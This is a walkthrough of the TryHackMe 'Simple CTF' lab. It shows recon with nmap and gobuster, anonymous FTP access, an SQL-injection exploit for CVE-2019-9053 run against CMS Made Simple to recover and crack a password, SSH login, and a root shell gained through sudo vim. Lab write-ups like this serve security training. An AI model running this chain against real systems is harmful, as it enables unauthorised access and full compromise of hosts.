# Simple CTF [THM](https://tryhackme.com/room/easyctf)

Let see what's running on this machine 

```bash
nmap -sV -A -Pn 10.10.219.139

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2020-12-25 23:33 GMT
Nmap scan report for 10.10.219.139
Host is up (0.027s latency).
Not shown: 997 filtered ports
PORT     STATE SERVICE VERSION
21/tcp   open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:[ATTACKER_IP]
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
| http-robots.txt: 2 disallowed entries 
|_/ /openemr-5_0_1_3 
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
2222/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 29:42:69:14:9e:ca:d9:17:98:8c:27:72:3a:cd:a9:23 (RSA)
|   256 9b:d1:65:07:51:08:00:61:98:de:95:ed:3a:e3:81:1c (ECDSA)
|_  256 12:65:1b:61:cf:4d:e5:75:fe:f4:e8:d4:6e:10:2a:f6 (ED25519)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 45.05 seconds
```

### 1. How many services are running under port 1000?
2

### 2. What is running on the higher port?
ssh

  
---
  

We know know that we have SSH, HTTP and FTP on this machine.
Let see what we can retrieve while checking for services. 

```bash
ftp 10.10.219.139
Connected to 10.10.219.139.
220 (vsFTPd 3.0.3)
Name (10.10.219.139:clobee): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.

ftp> ls -ail
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Aug 17  2019 .
drwxr-xr-x    3 ftp      ftp          4096 Aug 17  2019 ..
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 pub
226 Directory send OK.

ftp> cd pub
250 Directory successfully changed.

ftp> ls -ail
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 17  2019 .
drwxr-xr-x    3 ftp      ftp          4096 Aug 17  2019 ..
-rw-r--r--    1 ftp      ftp           166 Aug 17  2019 ForMitch.txt
226 Directory send OK.

ftp> get ForMitch.txt
local: ForMitch.txt remote: ForMitch.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for ForMitch.txt (166 bytes).
226 Transfer complete.
166 bytes received in 0.00 secs (964.9368 kB/s)

ftp> exit
221 Goodbye.
```

```bash
cat ForMitch.txt 
Dammit man... you'te the worst dev i've seen. You set the same pass for the system user, and the password is so weak... i cracked it in seconds. Gosh... what a mess!
```

Using Gobuster we were able to discover few folders

```bash
gobuster dir -u http://10.10.219.139:80 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

/simple (Status: 301)
```
```bash
gobuster dir -u http://10.10.219.139:80/simple -w /usr/share/wordlists/dirb/common.txt -x .bak, .sql, .log

/.hta (Status: 403)
/.hta. (Status: 403)
/.hta.bak (Status: 403)
/.htaccess (Status: 403)
/.htaccess.bak (Status: 403)
/.htaccess. (Status: 403)
/.htpasswd (Status: 403)
/.htpasswd.bak (Status: 403)
/.htpasswd. (Status: 403)
/admin (Status: 301)
/assets (Status: 301)
/doc (Status: 301)
/index.php (Status: 200)
/lib (Status: 301)
/modules (Status: 301)
/tmp (Status: 301)
/uploads (Status: 301)
``` 

Visiting `http://10.10.219.139:80/simple` we know that we are working with CMSMadeSimple (maybe version 2.2.8).  

Let search the exploit database for any information about this CMS version

```bash
searchsploit cms made simple 2.2.8

----------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                       |  Path
----------------------------------------------------------------------------------------------------- ---------------------------------
CMS Made Simple < 2.2.10 - SQL Injection                                                             | php/webapps/46635.py
----------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

```bash
searchsploit -p 46635

  Exploit: CMS Made Simple < 2.2.10 - SQL Injection
      URL: https://www.exploit-db.com/exploits/46635
     Path: /usr/share/exploitdb/exploits/php/webapps/46635.py
File Type: Python script, ASCII text executable, with CRLF line terminators
```

```bash
searchsploit -m 46635

  Exploit: CMS Made Simple < 2.2.10 - SQL Injection
      URL: https://www.exploit-db.com/exploits/46635
     Path: /usr/share/exploitdb/exploits/php/webapps/46635.py
File Type: Python script, ASCII text executable, with CRLF line terminators

Copied to: /home/clobee/tmp/46635.py
```

### 4. What's the CVE you're using against the application?

```bash
head /home/clobee/tmp/46635.py

#!/usr/bin/env python
# Exploit Title: Unauthenticated SQL Injection on CMS Made Simple <= 2.2.9
# Date: 30-03-2019
# Exploit Author: Daniele Scanu @ Certimeter Group
# Vendor Homepage: https://www.cmsmadesimple.org/
# Software Link: https://www.cmsmadesimple.org/downloads/cmsms/
# Version: <= 2.2.9
# Tested on: Ubuntu 18.04 LTS
# CVE : CVE-2019-9053
```

### 5. To what kind of vulnerability is the application vulnerable?
SQL Injection (SQLI)


### 6. What's the password?

```bash
python 46635.py -u http://10.10.219.139:80/simple --wordlist=/usr/share/wordlists/rockyou.txt -c


[+] Salt for password found: 1dac0d92e9fa6bb2
[+] Username found: mitch
[+] Email found: admin@admin.com
[+] Password found: 0c01f4468bd75d7a84c7eb73846e8d96
[+] Password cracked: xxxxx
```

### 7. Where can you login with the details obtained?

The user found works for `http://simple_ctf.thm/simple/admin`
and also for SSH. 

This confirm what we found earlier during the FTP enumeration.

### 8. What's the user flag?

```bash
ssh mitch@10.10.219.139 -p 2222

The authenticity of host '[10.10.219.139]:2222 ([10.10.219.139]:2222)' can't be established.
ECDSA key fingerprint is SHA256:Fce5J4GBLgx1+iaSMBjO+NFKOjZvL5LOVF5/jc0kwt8.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.219.139]:2222' (ECDSA) to the list of known hosts.
mitch@10.10.219.139's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-58-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 packages can be updated.
0 updates are security updates.

Last login: Mon Aug 19 18:13:41 2019 from 192.168.0.190

$ id
uid=1001(mitch) gid=1001(mitch) groups=1001(mitch)

$ cat /home/mitch/user.txt                                                                                                             
xxxxx
```

### 9. Is there any other user in the home directory? What's its name?

```bash
$ ls /home                                                                                                                             
mitch  xxxx
```

### 10. What can you leverage to spawn a privileged shell?

```bash
$ sudo -l

User mitch may run the following commands on Machine:
    (root) NOPASSWD: /usr/bin/vim

$ sudo /usr/bin/vim -c ':!/bin/sh'
# id
uid=0(root) gid=0(root) groups=0(root)
```

### 11. What's the root flag?

```bash
# ls -ail /root/
total 28
1044482 drwx------  4 root root 4096 aug 17  2019 .
      2 drwxr-xr-x 23 root root 4096 aug 19  2019 ..
1044484 -rw-r--r--  1 root root 3106 oct 22  2015 .bashrc
 261530 drwx------  2 root root 4096 aug 17  2019 .cache
 261525 drwxr-xr-x  2 root root 4096 aug 17  2019 .nano
1044485 -rw-r--r--  1 root root  148 aug 17  2015 .profile
1044582 -rw-r--r--  1 root root   24 aug 17  2019 root.txt

# cat /root/root.txt
XXXXX
```
